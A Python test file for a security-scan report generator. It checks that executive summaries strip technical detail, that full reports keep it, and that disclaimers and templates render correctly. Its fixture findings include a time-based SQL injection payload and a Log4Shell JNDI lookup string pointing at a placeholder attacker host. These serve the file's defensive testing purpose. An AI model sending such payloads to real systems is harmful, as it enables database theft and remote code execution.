"""Report generation + sanitizer tests (Phase D/G security check).

The headline assertion (REQ-49): the Executive Summary leaks NONE of the excluded technical
fields, including a field added to the schema after the fact (allow-list proof). Full
Technical, by contrast, must carry that detail. python-docx round-trips the bytes back to text.
"""
import io
import os
import sys

HERE = os.path.dirname(__file__)
sys.path.insert(0, os.path.join(HERE, "..", "common"))
sys.path.insert(0, os.path.join(HERE, "..", "report"))

from docx import Document  # noqa: E402

import generator  # noqa: E402
import sanitize  # noqa: E402

JOB = {"id": "job-123", "target": "http://t.local"}
FINDINGS = [
    {"name": "SQL Injection (id)", "severity": "critical", "host": "http://t.local",
     "url": "http://t.local/?id=1", "cwe": "CWE-89", "owasp": "A03:2021-Injection",
     "tool": "sqlmap", "evidence": "Payload: id=1 AND SLEEP(5)",
     "impact": "An attacker can read the entire database.",
     "remediation": "Use parameterized queries.", "risk_rating": "Critical"},
    {"name": "Apache Log4j RCE", "severity": "critical", "host": "http://t.local",
     "url": "http://t.local/api", "cve": "CVE-2021-44228", "cvss": 10.0, "cwe": "CWE-502",
     "owasp": "A06:2021-Vulnerable and Outdated Components", "tool": "nuclei",
     "evidence": "jndi:ldap://evil/x", "impact": "Remote code execution is possible.",
     "remediation": "Upgrade Log4j to 2.17+.", "risk_rating": "Critical"},
]


def _text(docx_bytes: bytes) -> str:
    doc = Document(io.BytesIO(docx_bytes))
    parts = [p.text for p in doc.paragraphs]
    for t in doc.tables:
        for row in t.rows:
            parts += [c.text for c in row.cells]
    return "\n".join(parts)


def test_executive_summary_excludes_technical_detail():
    text = _text(generator.generate(JOB, FINDINGS, "Executive Summary"))
    for leaked in ("SLEEP(5)", "CVE-2021-44228", "jndi", "sqlmap", "nuclei", "10.0"):
        assert leaked not in text, f"Executive Summary leaked technical detail: {leaked!r}"
    # ...but it must still convey the business content.
    assert "read the entire database" in text, "impact missing from exec summary"
    assert "parameterized queries" in text, "remediation missing from exec summary"


def test_full_technical_includes_detail():
    text = _text(generator.generate(JOB, FINDINGS, "Full Technical"))
    assert "CVE-2021-44228" in text and "SLEEP(5)" in text, "full technical dropped detail"


def test_every_report_carries_coverage_disclaimer():
    # No reader may mistake "no findings" for "fully secure" (SRS §1.4).
    for template in ("Executive Summary", "Full Technical"):
        text = _text(generator.generate(JOB, FINDINGS, template))
        assert "Scope and Coverage" in text, f"{template} missing coverage section"
        assert "does NOT mean the target is fully secure" in text, f"{template} missing the key caveat"
        assert "manual penetration test" in text.lower(), f"{template} missing manual-testing recommendation"


def test_sanitizer_is_allowlist():
    # A new sensitive field added to the schema must NOT cross by default.
    f = dict(FINDINGS[0], secret_db_dump="rows of customer PII", cve="CVE-2021-44228")
    out = sanitize.sanitize_finding(f)
    assert "secret_db_dump" not in out, "allow-list breached: new field leaked"
    assert "cve" not in out and "evidence" not in out and "tool" not in out
    assert out["impact"] and out["name"]   # business fields kept


def test_all_four_templates_generate_valid_docx():
    for template in ("Executive Summary", "Full Technical", "OWASP Web App", "ILCS Internal"):
        data = generator.generate(JOB, FINDINGS, template)
        assert data[:2] == b"PK", f"{template} did not produce a valid .docx"


def test_owasp_template_groups_by_category():
    text = _text(generator.generate(JOB, FINDINGS, "OWASP Web App"))
    assert "Findings by OWASP Category" in text
    assert "A03:2021-Injection" in text and "A06:2021" in text   # both categories present as groups


def test_ilcs_internal_is_bahasa_with_signoff():
    text = _text(generator.generate(JOB, FINDINGS, "ILCS Internal"))
    assert "Laporan VAPT" in text and "Temuan" in text            # Bahasa (BR-2)
    assert "Persetujuan" in text and "Tanda Tangan" in text       # sign-off table (TBD-1)
    assert "Pengujian penetrasi manual disarankan" in text        # coverage disclaimer in Bahasa (REQ-81)


def test_unknown_template_rejected():
    try:
        generator.generate(JOB, FINDINGS, "Nonexistent")
    except ValueError:
        return
    raise AssertionError("an unknown template should raise")


if __name__ == "__main__":
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
            print(f"{name} OK")
    print("test_report: all green")


FP = {"name": "Outdated jQuery", "severity": "low", "host": "http://t.local", "verdict": "fp",
      "impact": "n/a", "remediation": "n/a"}


def test_detailed_templates_have_their_sections():
    ft = _text(generator.generate(JOB, FINDINGS + [FP], "Full Technical"))
    for section in ("Document Control", "Scope and Methodology", "Risk Rating Methodology",
                    "Findings Summary", "Detailed Findings", "Remediation Roadmap", "VAR-001", "VAR-002",
                    "https://cwe.mitre.org/data/definitions/89.html", "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"):
        assert section in ft, f"Full Technical missing {section!r}"
    assert "Outdated jQuery" not in ft, "false positives must not appear in client reports"
    fh = _text(generator.generate(JOB, FINDINGS, "Formal Handover"))
    assert "Sign-off and Acceptance" in fh and "Received by (Client)" in fh
    assert "SLEEP(5)" not in fh, "handover carries no raw payloads"


def test_raw_findings_marks_false_positives():
    raw = _text(generator.generate(JOB, FINDINGS + [FP], "Raw Findings"))
    assert "Outdated jQuery" in raw and "FP" in raw and "TP" in raw


def test_executive_summary_new_layout_still_leaks_nothing():
    text = _text(generator.generate(JOB, FINDINGS + [FP], "Executive Summary"))
    for leaked in ("SLEEP(5)", "CVE-2021-44228", "jndi", "sqlmap", "Sqlmap", "Nuclei", "nuclei", "Katana", "10.0", "Outdated jQuery"):
        assert leaked not in text, leaked
    assert "Remediation Roadmap" in text and "overall risk rating is CRITICAL" in text
